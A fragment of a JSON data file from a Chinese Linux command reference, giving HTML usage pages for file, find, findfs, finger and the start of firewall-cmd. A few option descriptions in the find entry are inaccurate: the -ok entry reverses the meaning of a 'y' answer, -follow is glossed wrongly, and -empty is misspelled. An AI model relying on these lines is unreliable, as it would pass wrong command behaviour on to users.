class=\"hljs-keyword\">var</span>/spool/mail: directory\n\n[root<span class=\"hljs-meta\">@localhost</span> ~]<span class=\"hljs-comment\"># file -L /var/spool/mail</span>\n/<span class=\"hljs-keyword\">var</span>/spool/mail: directory\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "find",
        "des": "在指定目录下查找文件",
        "body": "<h1 id=\"find\">find</h1>\n<p>在指定目录下查找文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>find命令</strong> 用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">find</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-amin&lt;分钟&gt;：查找在指定时间曾被存取过的文件或目录，单位以分钟计算；</span>\n<span class=\"hljs-deletion\">-anewer&lt;参考文件或目录&gt;：查找其存取时间较指定文件或目录的存取时间更接近现在的文件或目录；</span>\n<span class=\"hljs-deletion\">-atime&lt;24小时数&gt;：查找在指定时间曾被存取过的文件或目录，单位以24小时计算；</span>\n<span class=\"hljs-deletion\">-cmin&lt;分钟&gt;：查找在指定时间之时被更改过的文件或目录；</span>\n<span class=\"hljs-deletion\">-cnewer&lt;参考文件或目录&gt;查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录；</span>\n<span class=\"hljs-deletion\">-ctime&lt;24小时数&gt;：查找在指定时间之时被更改的文件或目录，单位以24小时计算；</span>\n<span class=\"hljs-deletion\">-daystart：从本日开始计算时间；</span>\n<span class=\"hljs-deletion\">-depth：从指定目录下最深层的子目录开始查找；</span>\n<span class=\"hljs-deletion\">-expty：寻找文件大小为0 Byte的文件，或目录下没有任何子目录或文件的空目录；</span>\n<span class=\"hljs-deletion\">-exec&lt;执行指令&gt;：假设find指令的回传值为True，就执行该指令；</span>\n<span class=\"hljs-deletion\">-false：将find指令的回传值皆设为False；</span>\n<span class=\"hljs-deletion\">-fls&lt;列表文件&gt;：此参数的效果和指定“-ls”参数类似，但会把结果保存为指定的列表文件；</span>\n<span class=\"hljs-deletion\">-follow：排除符号连接；</span>\n<span class=\"hljs-deletion\">-fprint&lt;列表文件&gt;：此参数的效果和指定“-print”参数类似，但会把结果保存成指定的列表文件；</span>\n<span class=\"hljs-deletion\">-fprint0&lt;列表文件&gt;：此参数的效果和指定“-print0”参数类似，但会把结果保存成指定的列表文件；</span>\n<span class=\"hljs-deletion\">-fprintf&lt;列表文件&gt;&lt;输出格式&gt;：此参数的效果和指定“-printf”参数类似，但会把结果保存成指定的列表文件；</span>\n<span class=\"hljs-deletion\">-fstype&lt;文件系统类型&gt;：只寻找该文件系统类型下的文件或目录；</span>\n<span class=\"hljs-deletion\">-gid&lt;群组识别码&gt;：查找符合指定之群组识别码的文件或目录；</span>\n<span class=\"hljs-deletion\">-group&lt;群组名称&gt;：查找符合指定之群组名称的文件或目录；</span>\n<span class=\"hljs-deletion\">-help或--help：在线帮助；</span>\n<span class=\"hljs-deletion\">-ilname&lt;范本样式&gt;：此参数的效果和指定“-lname”参数类似，但忽略字符大小写的差别；</span>\n<span class=\"hljs-deletion\">-iname&lt;范本样式&gt;：此参数的效果和指定“-name”参数类似，但忽略字符大小写的差别；</span>\n<span class=\"hljs-deletion\">-inum&lt;inode编号&gt;：查找符合指定的inode编号的文件或目录；</span>\n<span class=\"hljs-deletion\">-ipath&lt;范本样式&gt;：此参数的效果和指定“-path”参数类似，但忽略字符大小写的差别；</span>\n<span class=\"hljs-deletion\">-iregex&lt;范本样式&gt;：此参数的效果和指定“-regexe”参数类似，但忽略字符大小写的差别；</span>\n<span class=\"hljs-deletion\">-links&lt;连接数目&gt;：查找符合指定的硬连接数目的文件或目录；</span>\n<span class=\"hljs-deletion\">-lname&lt;范本样式&gt;：指定字符串作为寻找符号连接的范本样式；</span>\n<span class=\"hljs-deletion\">-ls：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出；</span>\n<span class=\"hljs-deletion\">-maxdepth&lt;目录层级&gt;：设置最大目录层级；</span>\n<span class=\"hljs-deletion\">-mindepth&lt;目录层级&gt;：设置最小目录层级；</span>\n<span class=\"hljs-deletion\">-mmin&lt;分钟&gt;：查找在指定时间曾被更改过的文件或目录，单位以分钟计算；</span>\n<span class=\"hljs-deletion\">-mount：此参数的效果和指定“-xdev”相同；</span>\n<span class=\"hljs-deletion\">-mtime&lt;24小时数&gt;：查找在指定时间曾被更改过的文件或目录，单位以24小时计算；</span>\n<span class=\"hljs-deletion\">-name&lt;范本样式&gt;：指定字符串作为寻找文件或目录的范本样式；</span>\n<span class=\"hljs-deletion\">-newer&lt;参考文件或目录&gt;：查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录；</span>\n<span class=\"hljs-deletion\">-nogroup：找出不属于本地主机群组识别码的文件或目录；</span>\n<span class=\"hljs-deletion\">-noleaf：不去考虑目录至少需拥有两个硬连接存在；</span>\n<span class=\"hljs-deletion\">-nouser：找出不属于本地主机用户识别码的文件或目录；</span>\n<span class=\"hljs-deletion\">-ok&lt;执行指令&gt;：此参数的效果和指定“-exec”类似，但在执行指令之前会先询问用户，若回答“y”或“Y”，则放弃执行命令；</span>\n<span class=\"hljs-deletion\">-path&lt;范本样式&gt;：指定字符串作为寻找目录的范本样式；</span>\n<span class=\"hljs-deletion\">-perm&lt;权限数值&gt;：查找符合指定的权限数值的文件或目录；</span>\n<span class=\"hljs-deletion\">-print：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为每列一个名称，每个名称前皆有“./”字符串；</span>\n<span class=\"hljs-deletion\">-print0：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为全部的名称皆在同一行；</span>\n<span class=\"hljs-deletion\">-printf&lt;输出格式&gt;：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式可以自行指定；</span>\n<span class=\"hljs-deletion\">-prune：不寻找字符串作为寻找文件或目录的范本样式;</span>\n<span class=\"hljs-deletion\">-regex&lt;范本样式&gt;：指定字符串作为寻找文件或目录的范本样式；</span>\n<span class=\"hljs-deletion\">-size&lt;文件大小&gt;：查找符合指定的文件大小的文件；</span>\n<span class=\"hljs-deletion\">-true：将find指令的回传值皆设为True；</span>\n<span class=\"hljs-deletion\">-type&lt;文件类型&gt;：只寻找符合指定的文件类型的文件；</span>\n<span class=\"hljs-deletion\">-uid&lt;用户识别码&gt;：查找符合指定的用户识别码的文件或目录；</span>\n<span class=\"hljs-deletion\">-used&lt;日数&gt;：查找文件或目录被更改之后在指定时间曾被存取过的文件或目录，单位以日计算；</span>\n<span class=\"hljs-deletion\">-user&lt;拥有者名称&gt;：查找符和指定的拥有者名称的文件或目录；</span>\n<span class=\"hljs-deletion\">-version或——version：显示版本信息；</span>\n<span class=\"hljs-deletion\">-xdev：将范围局限在先行的文件系统中；</span>\n<span class=\"hljs-deletion\">-xtype&lt;文件类型&gt;：此参数的效果和指定“-type”参数类似，差别在于它针对符号连接检查。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>起始目录：查找文件的起始目录。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 当前目录搜索所有文件，文件内容 包含 “140.206.111.111” 的内容</span>\n<span class=\"hljs-built_in\">find</span> . -type f -name <span class=\"hljs-string\">\"*\"</span> | xargs grep <span class=\"hljs-string\">\"140.206.111.111\"</span>\n</code></pre>\n<h4 id=\"根据文件或者正则表达式进行匹配\">根据文件或者正则表达式进行匹配</h4>\n<p>列出当前目录及子目录下所有文件和文件夹</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> .\n</code></pre>\n<p>在<code>/home</code>目录下查找以.txt结尾的文件名</p>\n<pre><code class=\"language-shell\">find /home -name <span class=\"hljs-string\">\"*.txt\"</span>\n</code></pre>\n<p>同上，但忽略大小写</p>\n<pre><code class=\"language-shell\">find /home -iname <span class=\"hljs-string\">\"*.txt\"</span>\n</code></pre>\n<p>当前目录及子目录下查找所有以.txt和.pdf结尾的文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . \\( -<span class=\"hljs-built_in\">name</span> <span class=\"hljs-string\">\"*.txt\"</span> -o -<span class=\"hljs-built_in\">name</span> <span class=\"hljs-string\">\"*.pdf\"</span> \\)\n\n或\n\n<span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">name</span> <span class=\"hljs-string\">\"*.txt\"</span> -o -<span class=\"hljs-built_in\">name</span> <span class=\"hljs-string\">\"*.pdf\"</span>\n</code></pre>\n<p>匹配文件路径或者文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">find</span> <span class=\"hljs-regexp\">/usr/</span> -path <span class=\"hljs-string\">\"*local*\"</span>\n</code></pre>\n<p>基于正则表达式匹配文件路径</p>\n<pre><code class=\"language-shell\">find . <span class=\"hljs-operator\">-regex</span> <span class=\"hljs-string\">\".*\\(\\.txt\\|\\.pdf\\)<span class=\"hljs-variable\">$</span>\"</span>\n</code></pre>\n<p>同上，但忽略大小写</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -iregex <span class=\"hljs-string\">\".*\\(\\.txt\\|\\.pdf\\)$\"</span>\n</code></pre>\n<h4 id=\"否定参数\">否定参数</h4>\n<p>找出/home下不是以.txt结尾的文件</p>\n<pre><code class=\"language-shell\">find /home ! -name <span class=\"hljs-string\">\"*.txt\"</span>\n</code></pre>\n<h4 id=\"根据文件类型进行搜索\">根据文件类型进行搜索</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">type</span> 类型参数\n</code></pre>\n<p>类型参数列表：</p>\n<ul>\n<li>   <strong>f</strong>  普通文件</li>\n<li>   <strong>l</strong>  符号连接</li>\n<li>   <strong>d</strong>  目录</li>\n<li>   <strong>c</strong>  字符设备</li>\n<li>   <strong>b</strong>  块设备</li>\n<li>   <strong>s</strong>  套接字</li>\n<li>   <strong>p</strong>  Fifo</li>\n</ul>\n<h4 id=\"基于目录深度搜索\">基于目录深度搜索</h4>\n<p>向下最大深度限制为3</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -maxdepth <span class=\"hljs-number\">3</span> -<span class=\"hljs-built_in\">type</span> f\n</code></pre>\n<p>搜索出深度距离当前目录至少2个子目录的所有文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -mindepth <span class=\"hljs-number\">2</span> -<span class=\"hljs-built_in\">type</span> f\n</code></pre>\n<h4 id=\"根据文件时间戳进行搜索\">根据文件时间戳进行搜索</h4>\n<pre><code class=\"language-shell\">find . -<span class=\"hljs-keyword\">type</span> <span class=\"hljs-type\">f </span>时间戳\n</code></pre>\n<p>UNIX/Linux文件系统每个文件都有三种时间戳：</p>\n<ul>\n<li>   <strong>访问时间</strong> （-atime/天，-amin/分钟）：用户最近一次访问时间。</li>\n<li>   <strong>修改时间</strong> （-mtime/天，-mmin/分钟）：文件最后一次修改时间。</li>\n<li>   <strong>变化时间</strong> （-ctime/天，-cmin/分钟）：文件数据元（例如权限等）最后一次修改时间。</li>\n</ul>\n<p>搜索最近七天内被访问过的所有文件</p>\n<pre><code class=\"language-shell\">find . -<span class=\"hljs-keyword\">type</span> <span class=\"hljs-type\">f </span>-atime -<span class=\"hljs-number\">7</span>\n</code></pre>\n<p>搜索恰好在七天前被访问过的所有文件</p>\n<pre><code class=\"language-shell\">find . -<span class=\"hljs-keyword\">type</span> <span class=\"hljs-type\">f </span>-atime <span class=\"hljs-number\">7</span>\n</code></pre>\n<p>搜索超过七天内被访问过的所有文件</p>\n<pre><code class=\"language-shell\">find . -<span class=\"hljs-keyword\">type</span> <span class=\"hljs-type\">f </span>-atime +<span class=\"hljs-number\">7</span>\n</code></pre>\n<p>搜索访问时间超过10分钟的所有文件</p>\n<pre><code class=\"language-shell\">find . -<span class=\"hljs-keyword\">type</span> <span class=\"hljs-type\">f </span>-amin +<span class=\"hljs-number\">10</span>\n</code></pre>\n<p>找出比file.log修改时间更长的所有文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">find</span> . -<span class=\"hljs-built_in\">type</span> <span class=\"hljs-keyword\">f</span> -newer <span class=\"hljs-keyword\">file</span>.<span class=\"hljs-built_in\">log</span>\n</code></pre>\n<h4 id=\"根据文件大小进行匹配\">根据文件大小进行匹配</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">size</span> 文件大小单元\n</code></pre>\n<p>文件大小单元：</p>\n<ul>\n<li>   <strong>b</strong>  —— 块（512字节）</li>\n<li>   <strong>c</strong>  —— 字节</li>\n<li>   <strong>w</strong>  —— 字（2字节）</li>\n<li>   <strong>k</strong>  —— 千字节</li>\n<li>   <strong>M</strong>  —— 兆字节</li>\n<li>   <strong>G</strong>  —— 吉字节</li>\n</ul>\n<p>搜索大于10KB的文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">size</span> +<span class=\"hljs-number\">10</span>k\n</code></pre>\n<p>搜索小于10KB的文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">size</span> <span class=\"hljs-number\">-10</span>k\n</code></pre>\n<p>搜索等于10KB的文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">size</span> <span class=\"hljs-number\">10</span>k\n</code></pre>\n<h4 id=\"删除匹配文件\">删除匹配文件</h4>\n<p>删除当前目录下所有.txt文件</p>\n<pre><code class=\"language-shell\">find . -<span class=\"hljs-keyword\">type</span> f -<span class=\"hljs-type\">name</span> \"*.txt\" -<span class=\"hljs-keyword\">delete</span>\n</code></pre>\n<h4 id=\"根据文件权限所有权进行匹配\">根据文件权限/所有权进行匹配</h4>\n<p>当前目录下搜索出权限为777的文件</p>\n<pre><code class=\"language-shell\">find . -<span class=\"hljs-keyword\">type</span> <span class=\"hljs-type\">f </span>-perm <span class=\"hljs-number\">777</span>\n</code></pre>\n<p>找出当前目录下权限不是644的php文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">name</span> <span class=\"hljs-string\">\"*.php\"</span> ! -perm <span class=\"hljs-number\">644</span>\n</code></pre>\n<p>找出当前目录用户tom拥有的所有文件</p>\n<pre><code class=\"language-shell\">find . -<span class=\"hljs-keyword\">type</span> f -<span class=\"hljs-keyword\">user</span> <span class=\"hljs-title\">tom</span>\n</code></pre>\n<p>找出当前目录用户组sunk拥有的所有文件</p>\n<pre><code class=\"language-shell\">find . -<span class=\"hljs-keyword\">type</span> f -<span class=\"hljs-keyword\">group</span> <span class=\"hljs-title\">sunk</span>\n</code></pre>\n<h4 id=\"借助-exec选项与其他命令结合使用\">借助<code>-exec</code>选项与其他命令结合使用</h4>\n<p>找出当前目录下所有root的文件，并把所有权更改为用户tom</p>\n<pre><code class=\"language-shell\">find .-<span class=\"hljs-keyword\">type</span> f -<span class=\"hljs-keyword\">user</span> <span class=\"hljs-title\">root</span> -exec chown tom {} \\;\n</code></pre>\n<p>上例中， <strong>{}</strong>  用于与 <strong>-exec</strong> 选项结合使用来匹配所有文件，然后会被替换为相应的文件名。</p>\n<p>找出自己家目录下所有的.txt文件并删除</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> <span class=\"hljs-variable\">$HOME</span>/. -name <span class=\"hljs-string\">\"*.txt\"</span> -ok rm {} \\;\n</code></pre>\n<p>上例中， <strong>-ok</strong> 和 <strong>-exec</strong> 行为一样，不过它会给出提示，是否执行相应的操作。</p>\n<p>查找当前目录下所有.txt文件并把他们拼接起来写入到all.txt文件中</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">name</span> <span class=\"hljs-string\">\"*.txt\"</span> -<span class=\"hljs-built_in\">exec</span> cat {} \\;&gt; /all.txt\n</code></pre>\n<p>将30天前的.log文件移动到old目录中</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">type</span> f -mtime +<span class=\"hljs-number\">30</span> -<span class=\"hljs-built_in\">name</span> <span class=\"hljs-string\">\"*.log\"</span> -<span class=\"hljs-built_in\">exec</span> cp {} old \\;\n</code></pre>\n<p>找出当前目录下所有.txt文件并以“File:文件名”的形式打印出来</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">name</span> <span class=\"hljs-string\">\"*.txt\"</span> -<span class=\"hljs-built_in\">exec</span> printf <span class=\"hljs-string\">\"File: %s\\n\"</span> {} \\;\n</code></pre>\n<p>因为单行命令中-exec参数中无法使用多个命令，以下方法可以实现在-exec之后接受多条命令</p>\n<pre><code class=\"language-shell\">-<span class=\"hljs-keyword\">exec</span> ./<span class=\"hljs-keyword\">text</span>.sh {} \\;\n</code></pre>\n<h4 id=\"搜索但跳过指定的目录\">搜索但跳过指定的目录</h4>\n<p>查找当前目录或者子目录下所有.txt文件，但是跳过子目录sk</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">path</span> <span class=\"hljs-string\">\"./sk\"</span> -prune -o -name <span class=\"hljs-string\">\"*.txt\"</span> -<span class=\"hljs-built_in\">print</span>\n</code></pre>\n<blockquote>\n<p>:warning: ./sk 不能写成 ./sk/ ，否则没有作用。</p>\n</blockquote>\n<p>忽略两个目录</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">find</span> . \\( -path .<span class=\"hljs-regexp\">/sk -o  -path ./</span>st \\) -prune -o -name <span class=\"hljs-string\">\"*.txt\"</span> -<span class=\"hljs-keyword\">print</span>\n</code></pre>\n<blockquote>\n<p>:warning: 如果写相对路径必须加上<code>./</code></p>\n</blockquote>\n<h4 id=\"find其他技巧收集\">find其他技巧收集</h4>\n<p>要列出所有长度为零的文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -empty\n</code></pre>\n<h4 id=\"其它实例\">其它实例</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">find</span> <span class=\"hljs-regexp\">~ -name</span> <span class=\"hljs-string\">'*jpg'</span> <span class=\"hljs-comment\"># 主目录中找到所有的 jpg 文件。 -name 参数允许你将结果限制为与给定模式匹配的文件。</span>\nfind <span class=\"hljs-regexp\">~ -iname</span> <span class=\"hljs-string\">'*jpg'</span> <span class=\"hljs-comment\"># -iname 就像 -name，但是不区分大小写</span>\nfind <span class=\"hljs-regexp\">~ (</span> -iname <span class=\"hljs-string\">'jpeg'</span> -o -iname <span class=\"hljs-string\">'jpg'</span> ) <span class=\"hljs-comment\"># 一些图片可能是 .jpeg 扩展名。幸运的是，我们可以将模式用“或”（表示为 -o）来组合。</span>\nfind <span class=\"hljs-regexp\">~ \\(</span> -iname <span class=\"hljs-string\">'*jpeg'</span> -o -iname <span class=\"hljs-string\">'*jpg'</span> \\) -type f <span class=\"hljs-comment\"># 如果你有一些以 jpg 结尾的目录呢？ （为什么你要命名一个 bucketofjpg 而不是 pictures 的目录就超出了本文的范围。）我们使用 -type 参数修改我们的命令来查找文件。</span>\nfind <span class=\"hljs-regexp\">~ \\(</span> -iname <span class=\"hljs-string\">'*jpeg'</span> -o -iname <span class=\"hljs-string\">'*jpg'</span> \\) -type d <span class=\"hljs-comment\"># 也许你想找到那些命名奇怪的目录，以便稍后重命名它们</span>\n</code></pre>\n<p>最近拍了很多照片，所以让我们把它缩小到上周更改的文件</p>\n<pre><code class=\"language-shell\">find ~ <span class=\"hljs-string\">\\(</span> -iname <span class=\"hljs-string\">'*jpeg'</span> -o -iname <span class=\"hljs-string\">'*jpg'</span> <span class=\"hljs-string\">\\)</span> -type f -mtime -<span class=\"hljs-number\">7</span>\n</code></pre>\n<p>你可以根据文件状态更改时间 （ctime）、修改时间 （mtime） 或访问时间 （atime） 来执行时间过滤。 这些是在几天内，所以如果你想要更细粒度的控制，你可以表示为在几分钟内（分别是 cmin、mmin 和 amin）。 除非你确切地知道你想要的时间，否则你可能会在 + （大于）或 - （小于）的后面加上数字。</p>\n<p>但也许你不关心你的照片。也许你的磁盘空间不够用，所以你想在 log 目录下找到所有巨大的（让我们定义为“大于 1GB”）文件：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">find</span> <span class=\"hljs-regexp\">/var/</span>log -<span class=\"hljs-keyword\">size</span> +<span class=\"hljs-number\">1</span>G\n</code></pre>\n<p>或者，也许你想在 /data 中找到 bcotton 拥有的所有文件：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-title\">find</span> /<span class=\"hljs-class\"><span class=\"hljs-keyword\">data</span> -owner bcotton</span>\n</code></pre>\n<p>你还可以根据权限查找文件。也许你想在你的主目录中找到对所有人可读的文件，以确保你不会过度分享。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> ~ -perm <span class=\"hljs-attribute\">-o</span>=r\n</code></pre>\n<p>删除 mac 下自动生成的文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> ./ -<span class=\"hljs-built_in\">name</span> <span class=\"hljs-string\">'__MACOSX'</span> -depth -<span class=\"hljs-built_in\">exec</span> rm -rf {} \\;\n</code></pre>\n<p>统计代码行数</p>\n<pre><code class=\"language-shell\">find . -name <span class=\"hljs-string\">\"*.java\"</span>|<span class=\"hljs-type\">xargs</span> cat|<span class=\"hljs-type\">grep</span> -v ^$|<span class=\"hljs-type\">wc</span> -l # 代码行数统计, 排除空行\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "findfs",
        "des": "标签或UUID查找文件系统",
        "body": "<h1 id=\"findfs\">findfs</h1>\n<p>标签或UUID查找文件系统</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>findfs命令</strong> 依据卷标（Label）和UUID查找文件系统所对应的设备文件。findfs命令会搜索整个磁盘，看是否有匹配的标签或者UUID没有，如果有则打印到标注输出上。findfs命令也是e2fsprogs项目的一部分。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">findfs</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p><code>LABEL=&lt;卷标&gt;</code>或者<code>UUID=&lt;UUID&gt;</code>：按照卷标或者UUID查询文件系统。</p>\n<h3 id=\"实例\">实例</h3>\n<p>通过卷标名查找对应的文件系统：</p>\n<pre><code class=\"language-shell\">findfs LABEL=/boot\n<span class=\"hljs-regexp\">/dev/</span>hda1\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "finger",
        "des": "用于查找并显示用户信息",
        "body": "<h1 id=\"finger\">finger</h1>\n<p>用于查找并显示用户信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>finger命令</strong> 用于查找并显示用户信息。包括本地与远端主机的用户皆可，帐号名称没有大小写的差别。单独执行finger指令，它会显示本地主机现在所有的用户的登陆信息，包括帐号名称，真实姓名，登入终端机，闲置时间，登入时间以及地址和电话。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">finger</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-l：列出该用户的帐号名称，真实姓名，用户专属目录，登入所用的Shell，登入时间，转信地址，电子邮件状态，还有计划文件和方案文件内容；</span>\n<span class=\"hljs-deletion\">-m：排除查找用户的真实姓名；</span>\n<span class=\"hljs-deletion\">-s：列出该用户的帐号名称，真实姓名，登入终端机，闲置时间，登入时间以及地址和电话；</span>\n<span class=\"hljs-deletion\">-p：列出该用户的帐号名称，真实姓名，用户专属目录，登入所用的Shell，登入时间，转信地址，电子邮件状态，但不显示该用户的计划文件和方案文件内容。</span>\n</code></pre>\n<p>不指定finger的选项如果提供操作者的话，缺省设为<code>-l</code>输出风格，否则为<code>-s</code>风格，注意在两种格式中，如果信息不足，都有一些域可能丢失，如果没有指定参数finger会为当前登录的每个用户打印一个条目。</p>\n<h3 id=\"参数\">参数</h3>\n<p>用户名：指定要查询信息的用户。</p>\n<h3 id=\"实例\">实例</h3>\n<p>在计算机上使用finger：</p>\n<pre><code class=\"language-shell\">[root@localhost root]# finger\n<span class=\"hljs-keyword\">login</span> <span class=\"hljs-type\">Name</span> Tty Idle <span class=\"hljs-keyword\">Login</span> <span class=\"hljs-type\">time</span> Office Office Phone\nroot root tty1 <span class=\"hljs-number\">2</span> <span class=\"hljs-type\">Dec</span> <span class=\"hljs-number\">18</span> <span class=\"hljs-number\">13</span>\nroot root pts/<span class=\"hljs-number\">0</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-type\">Dec</span> <span class=\"hljs-number\">18</span> <span class=\"hljs-number\">13</span>\nroot root *pts/<span class=\"hljs-number\">1</span> <span class=\"hljs-type\">Dec</span> <span class=\"hljs-number\">18</span> <span class=\"hljs-number\">13</span>\n</code></pre>\n<p>如果要查询远程机上的用户信息，需要在用户名后面接<code>@主机名</code>，采用<code>用户名@主机名</code>的格式，不过要查询的网络主机需要运行finger守护进程的支持。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "firewall-cmd",
        "des": "Linux上新用的防火墙软件，跟iptables差不多的工具",
        "body": "<h1 id=\"firewall-cmd\">firewall-cmd</h1>\n<p>Linux上新用的防火墙软件，跟iptables差不多的工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>firewall-cmd 是 firewalld的字符界面管理工具，firewalld是centos7的一大特性，最大的好处有两个：支持动态更新，不用重启服务；第二个就是加入了防火墙的“zone”概念。</p>\n<p>firewalld跟iptables比起来至少有两大好处：</p>\n<ol>\n<li>firewalld可以动态修改单条规则，而不需要像iptables那样，在修改了规则后必须得全部刷新才可以生效。</li>\n<li>firewalld在使用上要比iptables人性化很多，即使不明白“五张表五条链”而且对TCP/IP协议也不理解也可以实现大部分功能。</li>\n</ol>\n<p>firewalld自身并不具备防火墙的功能，而是和iptables一样需要通过内核的netfilter来实现，也就是说firewalld和 iptables一样，他们的作用都是用于维护规则，而真正使用规则干活的是内核的netfilter，只不过firewalld和iptables的结 构以及使用方法不一样罢了。</p>\n<p><strong>命令格式</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">firewall</span>-cmd<span class=\"hljs-meta\"> [选项 ... ]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<p>通用选项</p>\n<pre><code class=\"language-shell\">-<span class=\"hljs-string\">h</span>, <span class=\"hljs-built_in\">--help</span>    <span class=\"hljs-comment\"># 显示帮助信息；</span>\n-<span class=\"hljs-string\">V</span>, <span class=\"hljs-built_in\">--version</span> <span class=\"hljs-comment\"># 显示版本信息. （这个选项不能与其他选项组合）；</span>\n-<span class=\"hljs-string\">q</span>, <span class=\"hljs-built_in\">--quiet</span>   <span class=\"hljs-comment\"># 不打印状态消息；</span>\n</code></pre>\n<p>状态选项</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">--state</span>                <span class=\"hljs-comment\"># 显示firewalld的状态；</span>\n<span class=\"hljs-built_in\">--reload</span>               <span class=\"hljs-comment\"># 不中断服务的重新加载；</span>\n<span class=\"hljs-built_in\">--complete-reload</span>      <span class=\"hljs-comment\"># 中断所有连接的重新加载；</span>\n<span class=\"hljs-built_in\">--runtime-to-permanent</span> <span class=\"hljs-comment\"># 将当前防火墙的规则永久保存；</span>\n<span class=\"hljs-built_in\">--check-config</span>         <span class=\"hljs-comment\"># 检查配置正确性；</span>\n</code></pre>\n<p>日志选项</p>\n<pre><code class=\"language-shell\">--<span class=\"hljs-built_in\">get</span>-<span class=\"hljs-built_in\">log</span>-denied         # 获取记录被拒绝的日志；\n--<span class=\"hljs-keyword\">set</span>-<span class=\"hljs-built_in\">log</span>-denied=<span class=\"hljs-symbol\">&lt;value&gt;</span> # 设置记录被拒绝的日志，只能为 <span class=\"hljs-string\">'all'</span>,<span class=\"hljs-string\">'unicast'</span>,<span class=\"hljs-string\">'broadcast'</span>,<span class=\"hljs-string\">'multicast'</span>,<span class=\"hljs-string\">'off'</span> 其中的一个；\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># 安装firewalld</span>\nyum install firewalld firewall-config\n\nsystemctl start  firewalld <span class=\"hljs-meta\"># 启动</span>\nsystemctl <span class=\"hljs-keyword\">stop</span> firewalld  <span class=\"hljs-meta\"># 停止</span>\nsystemctl <span class=\"hljs-keyword\">enable</span> firewalld <span class=\"hljs-meta\"># 启用自动启动</span>\nsystemctl 